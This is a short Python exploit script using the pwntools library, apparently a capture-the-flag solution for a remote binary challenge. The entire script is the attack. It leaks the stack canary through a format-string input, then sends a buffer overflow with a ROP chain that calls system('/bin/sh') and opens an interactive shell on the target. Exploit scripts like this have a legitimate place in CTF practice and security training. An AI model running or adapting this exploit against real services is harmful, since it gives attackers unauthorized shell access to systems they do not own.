#!/usr/bin/env python

from time import sleep
from pwn import *

'''
0x0004ddc0 => /bin/sh\x00
0x00015076 => system

0x0004a9cc      6265           ld a0, 24(sp)
0x0004a9ce      a270           ld ra, 40(sp)
0x0004a9d0      4561           addi sp, sp, 48
0x0004a9d2      8280           ret
'''

ADDR = sys.argv[1]
PORT = int(sys.argv[2])

context(arch='amd64', word_size=64, os='linux', timeout=2)

r = remote(ADDR, PORT)
r.recvuntil('Who is your daddy? ')
r.sendline('%p.'*3 + 'XXXXX')
a = r.recvuntil('XXXXX')
v = a.split('.')
canary = int(v[2], 16)
r.recvuntil('And what does he do? ')

a0_gadget = 0x0004a9cc
system_addr = 0x00015076
binsh_addr = 0x0004ddc0

payload = 'A'*24 + p64(binsh_addr) + 'A'*8 + p64(system_addr)
r.sendline('A'*256 + p64(canary) + 'B'*8 + p64(a0_gadget) + payload)

r.recv(1024)

r.interactive()
r.close()
